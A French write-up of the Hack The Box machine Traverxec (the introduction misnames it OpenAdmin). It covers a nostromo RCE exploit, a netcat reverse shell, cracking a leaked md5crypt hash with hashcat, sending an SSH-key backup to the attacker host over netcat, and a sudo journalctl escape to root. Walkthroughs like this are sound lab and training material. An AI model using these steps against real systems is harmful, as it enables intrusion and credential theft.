Résolution de la box Traverexec

Introduction

La box OpenAdmin de Hack The Box est une box Linux de difficulté “Easy”.

Foothold

Enumération

Comme d’habitude on commence avec un nmap.

On voit via searchsploit que la version de nostromo est vulnérable à une RCE

Exploit

On récupère le script présent sur exploitdb https://www.exploit-db.com/exploits/47837 puis on l’execute pour vérifier la vulnérabilité.

Maintenant on va s’envoyer un shell via netcat.

Et on vérifie sur notre port en écoute si on l’a bien reçu.

User

Enumération

On commence par regarder les différents users présents sur la machine.

Ici on voit un utilisateur David. Ca va être notre cible. En regardant les droits de son dossier Home on voit que l’on a les droits d’execution dessus. On voit donc qu’on peut se déplacer à l’intérieur.

On récupere aussi linPEAS.sh sur la machine pour énumérer.

On trouve des répertoires interessants et un mot de passe dans les répertoires se référant à notre service nostromo.

En regardant le hash présent dans le .htpasswd on voit qu’il est de type md5.

david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/

Maintenant que nous connaissons le type du hash nous pouvons utiliser hashcat pour essayer de trouver le mot de passe.

sudo hashcat -m 500 hash /usr/share/wordlists/rockyou.txt

Hashcat arrive à nous fournir un mot de passe.

En continuant d’énumérer on trouve dans le fichier nhttpd les lignes suivantes.

Exploit

On avait relevé tout à l’heure que l’on avait le droit d’execution sur le dossier Home de David.

On trouve dans le dossier Protected-file-area un backup des clés ssh. Via netcat, on envoie le fichier en ouvrant un port sur notre machine.

nc 10.10.14.10 1234 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz

Et on le récupère avec cette commande

nc -nlvp 1234 > backup-ssh.tgz

Ici il était aussi possible de se connecter directement sur le site web avec le mot de passe trouvé avec hashcat. Maintenant, on extrait l’archive.

On crack ensuite la clé privée rsa grace à ssh2john pour trouver la passphrase

On peut maintenant se connecter en ssh avec l’utilisateur David

Root

Enumération

On peut voir qu’il y a un dossier bin dans le répertoire personnel de David avec les fichiers suivants.

Exploit

On voit que journalctl est exécuté en tant que sudo. En regardant dans les gtfobins on peut voir qu’il est possible d’obtenir un shell root. Pour cela il suffit d’ajouter !/bin/bash lorsque le fichier sera lu avec less.

Cependant ici on voit que less n’intervient pas. C’est parce que la taille de notre terminal est trop longue.

Maintenant on peut lancer notre exploit.
